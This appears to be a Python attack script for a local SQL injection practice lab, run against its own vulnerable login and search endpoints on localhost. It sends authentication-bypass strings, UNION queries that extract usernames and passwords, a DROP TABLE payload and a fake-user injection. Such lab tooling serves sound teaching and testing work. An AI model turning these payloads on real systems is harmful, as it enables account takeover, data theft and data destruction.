# attacker.py
import requests
import time
import threading

BASE_URL = "http://localhost:5000"

def test_sql_injection(payload, description):
    """Test SQL injection payloads against vulnerable endpoints"""
    print(f"\n[+] Testing: {description}")
    print(f"    Payload: {payload}")
    
    # Test vulnerable login
    data = {
        'username': payload,
        'password': 'anything'
    }
    
    try:
        response = requests.post(f"{BASE_URL}/login-vulnerable", data=data)
        if "Welcome" in response.text or "admin" in response.text.lower():
            print("    ✓ SUCCESS: Login bypassed!")
        else:
            print("    ✗ Failed")
    except Exception as e:
        print(f"    Error: {e}")

def test_search_injection(payload, description):
    """Test SQL injection in search functionality"""
    print(f"\n[+] Testing Search: {description}")
    print(f"    Payload: {payload}")
    
    try:
        response = requests.get(f"{BASE_URL}/search", params={'query': payload})
        if "error" not in response.text.lower() and len(response.text) > 1000:
            print("    ✓ SUCCESS: Data extracted!")
        else:
            print("    ✗ Failed or limited results")
    except Exception as e:
        print(f"    Error: {e}")

def automated_attack():
    """Run automated SQL injection attacks"""
    print("🚀 Starting automated SQL injection attacks...")
    
    # Common SQL injection payloads
    payloads = [
        ("' OR '1'='1", "Basic authentication bypass"),
        ("admin'--", "Comment out password check"),
        ("' OR 1=1--", "Boolean-based blind"),
        ("' UNION SELECT 1,2,3--", "Union-based extraction"),
        ("' OR username LIKE '%admin%'--", "Conditional extraction"),
        ("'; DROP TABLE users--", "Destructive payload (should fail)"),
        ("' OR '1'='1' OR '", "Complex boolean logic"),
    ]
    
    for payload, description in payloads:
        test_sql_injection(payload, description)
        time.sleep(1)  # Be nice to the server
    
    # Search-specific payloads
    search_payloads = [
        ("' UNION SELECT id,username,password,email FROM users--", "Extract all users"),
        ("test' OR '1'='1'--", "Return all records"),
        ("' AND 1=2 UNION SELECT 1,'admin','hacked','hacked@evil.com'--", "Inject fake user"),
    ]
    
    for payload, description in search_payloads:
        test_search_injection(payload, description)
        time.sleep(1)

def view_logs():
    """View the attack logs"""
    print("\n📋 Viewing attack logs...")
    try:
        response = requests.get(f"{BASE_URL}/logs")
        print(response.text)
    except Exception as e:
        print(f"Error accessing logs: {e}")

if __name__ == "__main__":
    print("🔍 SQL Injection Self-Attack Tool")
    print("=" * 50)
    
    # Wait for server to start
    time.sleep(2)
    
    # Run automated attacks
    automated_attack()
    
    # Show logs
    view_logs()